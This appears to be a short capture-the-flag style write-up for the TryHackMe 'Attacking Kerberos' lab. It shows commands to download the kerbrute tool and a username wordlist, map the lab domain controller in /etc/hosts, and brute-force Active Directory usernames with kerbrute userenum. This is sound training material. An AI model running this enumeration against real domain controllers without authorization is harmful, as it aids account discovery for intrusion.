# Attacking Kerberos

**Room Link:** [https://tryhackme.com/room/attackingkerberos](https://tryhackme.com/room/attackingkerberos)



## Presteps for Lab

### Kerbrute Installation &#x20;

&#x20;Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute && chmod +x kerbrute 
```

### Download wordlist

```
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt
```

### Add hostname to host file

```
echo $VICTIM CONTROLLER.local  >> /etc/hosts
cat /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## Enumeration w/ Kerbrute

This will brute force user accounts from a domain controller using a supplied wordlist

```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
